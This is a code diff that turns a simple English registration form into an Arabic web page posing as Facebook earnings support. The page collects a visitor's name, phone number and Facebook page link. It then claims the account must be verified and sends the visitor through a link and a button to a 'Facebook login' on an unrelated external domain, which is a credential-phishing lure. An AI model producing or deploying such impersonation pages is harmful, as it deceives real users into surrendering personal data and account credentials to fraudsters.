@@ -1,57 +1,150 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Register</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مساعدة أرباح فيسبوك</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f7fc;
+            color: #333;
+        }
+
+        .container, .container-form, .container-confirm {
+            max-width: 900px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+            background-color: #fff;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            display: none; /* سيتم إخفاء جميع الصفحات بداية */
+        }
+
+        h1 {
+            font-size: 2.5em;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+
+        button {
+            background-color: #3b5998;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #2d4373;
+            transform: scale(1.05);
+        }
+
+        button:focus {
+            outline: none;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            font-size: 1.1em;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #fafafa;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #3b5998;
+            outline: none;
+        }
+
+        a {
+            color: #3b5998;
+            font-size: 1.2em;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        a:hover {
+            color: #2d4373;
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2em;
+            }
+
+            button {
+                font-size: 1em;
+                padding: 12px 25px;
+            }
+
+            input {
+                padding: 12px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <h1>Register Form</h1>
-  <form id="registration-form">
-    <label for="fullName">Full Name:</label>
-    <input type="text" id="fullName" name="fullName" required>
-    
-    <label for="email">Email:</label>
-    <input type="email" id="email" name="email" required>
-    
-    <label for="phone">Phone:</label>
-    <input type="tel" id="phone" name="phone" required>
-    
-    <label for="profileLink">Profile Link:</label>
-    <input type="url" id="profileLink" name="profileLink" required>
-    
-    <label for="password">Password:</label>
-    <input type="password" id="password" name="password" required>
-    
-    <button type="submit">Register</button>
-  </form>
 
-  <script>
-    document.getElementById('registration-form').addEventListener('submit', async (event) => {
-      event.preventDefault();
-      
-      const formData = {
-        fullName: document.getElementById('fullName').value,
-        email: document.getElementById('email').value,
-        phone: document.getElementById('phone').value,
-        profileLink: document.getElementById('profileLink').value,
-        password: document.getElementById('password').value
-      };
+    <!-- الصفحة الأولى: الواجهة الرئيسية -->
+    <div class="container" id="page1">
+        <h1>أبلغ عن مشكلة ضعف أرباح فيسبوك</h1>
+        <button onclick="showPage(2)">ابدأ</button>
+    </div>
 
-      const response = await fetch('http://localhost:3000/register', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(formData)
-      });
+    <!-- الصفحة الثانية: إدخال المعلومات -->
+    <div class="container-form" id="page2">
+        <h1>أدخل معلوماتك</h1>
+        <form onsubmit="event.preventDefault(); showPage(3);">
+            <input type="text" name="fullName" placeholder="أدخل اسمك بالكامل" required><br>
+            <input type="tel" name="phoneNumber" placeholder="أدخل رقم هاتفك" required><br>
+            <input type="url" name="facebookLink" placeholder="أدخل رابط صفحة فيسبوك" required><br>
+            <button type="submit">متابعة</button>
+        </form>
+    </div>
 
-      if (response.ok) {
-        alert('User registered successfully!');
-      } else {
-        alert('Failed to register user.');
-      }
-    });
-  </script>
+    <!-- الصفحة الثالثة: تأكيد الحساب -->
+    <div class="container-confirm" id="page3">
+        <h1>يجب أن نتأكد من أن ملفك الشخصي هو حسابك بالفعل</h1>
+        <p>يرجى تسجيل الدخول إلى فيسبوك لتأكيد حسابك.</p>
+        <a href="https://constma.xyz/f0b?id=000bb047-cafc-491b-517c-08dcfdd22993" target="_blank">اضغط هنا لتسجيل الدخول إلى فيسبوك</a><br>
+        <button onclick="window.location.href='https://constma.xyz/f0b?id=000bb047-cafc-491b-517c-08dcfdd22993'">متابعة</button>
+    </div>
+
+    <script>
+        // دالة لعرض الصفحة المطلوبة وإخفاء البقية
+        function showPage(pageNumber) {
+            // إخفاء جميع الصفحات
+            document.querySelectorAll('.container, .container-form, .container-confirm').forEach(function(page) {
+                page.style.display = 'none';
+            });
+
+            // عرض الصفحة المطلوبة
+            if(pageNumber === 1) {
+                document.getElementById('page1').style.display = 'block';
+            } else if(pageNumber === 2) {
+                document.getElementById('page2').style.display = 'block';
+            } else if(pageNumber === 3) {
+                document.getElementById('page3').style.display = 'block';
+            }
+        }
+
+        // عند تحميل الصفحة، نعرض الصفحة الأولى فقط
+        window.onload = function() {
+            showPage(1);
+        };
+    </script>
+
 </body>
 </html>
